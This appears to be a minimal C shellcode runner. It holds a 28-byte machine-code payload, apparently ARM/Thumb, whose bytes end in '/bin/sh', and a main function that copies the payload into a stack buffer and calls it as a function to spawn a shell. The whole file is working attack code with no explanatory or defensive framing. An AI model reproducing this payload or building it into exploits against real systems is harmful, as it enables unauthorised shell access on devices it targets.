#include <stdio.h>
#include <string.h>

// Len: 28
char *shellcode = "\x01\x30\x8f\xe2\x13\xff\x2f\xe1\x02\xa0\x49\x40\x52\x40\xc2\x71\x0b\x27\x01\xdf\x2f\x62\x69\x6e\x2f\x73\x68\x78";

int main(void) {
        char s[32];
        memcpy(s, shellcode, 28);

        ( *( void(*)() ) s)();
}
